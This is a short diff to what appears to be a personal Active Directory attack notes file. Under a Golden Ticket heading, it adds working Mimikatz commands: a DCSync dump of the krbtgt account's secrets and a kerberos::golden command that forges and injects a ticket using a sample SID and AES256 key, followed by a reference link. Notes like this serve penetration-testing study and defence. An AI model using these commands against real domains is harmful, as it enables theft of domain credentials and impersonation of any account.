@@ -81,6 +81,13 @@ Active Directory Attacks:-
 	Golden Ticket:-
 		
 		The Golden Ticket is the Kerberos authentication token for the KRBTGT account, a special hidden account with the job of encrypting all the authentication tokens for the DC. That Golden Ticket can then use a pass-the-hash technique to log into any account, allowing attackers to move around unnoticed inside the network
+		
+		Steps:-
+			
+			lsadump::dcsync /user:DOMAIN\Krbtgt
+			kerberos::golden /domain:domain.com /sid:S-1-5-21-5840559-2756745051-1363507867 /aes256:ffa8bd983a5a03618bdf577c2d79a467265f140ba339b89cc0a9c1bfdb4747f5 /user:NonExistentUser /ticket:GoldenTicket.kirbi /ptt
+
+			for more details https://www.netwrix.com/how_golden_ticket_attack_works.html
 	
 	Silver Ticket:-
 	
